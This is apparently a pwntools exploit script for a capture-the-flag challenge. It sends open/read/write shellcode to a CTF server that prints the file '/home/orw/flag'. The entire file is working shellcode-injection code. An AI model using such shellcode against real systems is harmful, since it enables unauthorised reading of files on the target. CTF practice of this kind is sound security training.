#!/usr/bin/env python
# coding=utf-8
from pwn import *
p=remote('csie.ctf.tw',10124)
shellcode='''
push 0x00
push 0x67616c66
push 0x2f77726f
push 0x2f656d6f
push 0x682f2f2f
mov eax,5
mov ebx,esp
syscall
mov ebx,eax
mov eax,3
mov ecx,esp
mov edx,60
syscall
mov eax,4
mov ebx,1
syscall
'''
shellcode=asm(shellcode)
p.recvuntil(":")
p.send(shellcode)
p.interactive()
